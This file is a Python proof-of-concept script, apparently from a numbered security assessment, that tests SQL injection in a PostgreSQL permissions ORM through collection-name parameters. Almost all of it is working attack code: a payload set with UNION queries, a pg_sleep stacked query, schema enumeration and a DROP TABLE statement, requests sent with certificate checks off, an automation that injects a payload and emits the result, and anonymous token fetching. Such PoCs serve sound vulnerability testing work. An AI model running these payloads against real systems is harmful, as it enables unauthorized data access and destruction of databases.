#!/usr/bin/env python3
"""
PoC #11 — SQL Injection in Permissions ORM (PostgreSQL)
HIGH: String interpolation in raw SQL queries for collection stats/schema/drop.

Note: Partially mitigated by testCollectionNames() — this PoC tests if
the mitigation can be bypassed or if edge cases exist.

Usage: python3 poc_11_sql_injection.py --target https://dev.example.com --token AUTH_TOKEN
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()


# SQL injection payloads for double-quoted identifiers
SQLI_PAYLOADS = {
    "basic_union": 'test" UNION SELECT version()--',
    "stacked_query": 'test"; SELECT pg_sleep(5)--',
    "info_schema": 'test" UNION SELECT table_name FROM information_schema.tables--',
    "double_quote_escape": 'test""; DROP TABLE IF EXISTS sqli_poc--',
    "comment_bypass": 'test"/**/UNION/**/SELECT/**/version()--',
}


def test_collection_stats_sqli(base_url, token, payload_name, payload):
    """Test SQL injection in getCollectionStats endpoint."""
    # The permissions package is used internally, but may be exposed via admin APIs
    # Try various endpoints that might use collection name parameter

    endpoints = [
        f"/v2/collections/{payload}/stats",
        f"/v2/workspaces/any/collections/{payload}",
    ]

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    for endpoint in endpoints:
        url = f"{base_url}{endpoint}"
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=15)
            if r.status_code == 200:
                print(f"    [HIGH] Endpoint accepted payload: {endpoint}")
                print(f"    Response: {r.text[:500]}")
                return True
            elif r.status_code == 500:
                # 500 with SQL error = injection confirmed even if not exploitable
                if any(kw in r.text.lower() for kw in ["sql", "syntax", "relation", "column", "postgresql"]):
                    print(f"    [HIGH] SQL error in response — injection point confirmed!")
                    print(f"    Error: {r.text[:500]}")
                    return True
        except:
            pass
    return False


def test_sqli_via_automation(base_url, workspace_id, token):
    """Test SQL injection via collections module in automations."""
    print("\n[*] Testing SQL injection via automation collections module...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    automation = {
        "slug": "poc-sqli-test",
        "name": "PoC SQL Injection",
        "trigger": {"events": ["poc.sqli.test"]},
        "instructions": [
            {
                "collections.findMany": {
                    "collection": 'test" UNION SELECT version()--',
                    "query": {}
                },
                "output": "sqli_result"
            },
            {
                "emit": {
                    "event": "poc.sqli.result",
                    "payload": "{{sqli_result}}"
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [INFO] Automation created — trigger 'poc.sqli.test' and check results")
            return True
        else:
            print(f"  Response: {r.text[:300]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def main():
    parser = argparse.ArgumentParser(description="PoC #11: SQL Injection in Permissions ORM")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    parser.add_argument("--workspace-id", default=None, help="Workspace ID for automation-based test")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print("=" * 60)

    print("\n[*] Testing SQL injection payloads via direct endpoints...")
    results = {}
    for name, payload in SQLI_PAYLOADS.items():
        print(f"\n  [*] Payload: {name}")
        results[name] = test_collection_stats_sqli(base, args.token, name, payload)

    if args.workspace_id:
        results["automation_sqli"] = test_sqli_via_automation(base, args.workspace_id, args.token)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'SQL ERROR / VULNERABLE' if v else 'NOT EXPLOITABLE VIA THIS VECTOR'}")
    print("\n[*] NOTE: These endpoints may not be directly exposed.")
    print("[*] The SQLi is in the permissions ORM used internally.")
    print("[*] Best tested via automation collections module or admin API.")


if __name__ == "__main__":
    main()
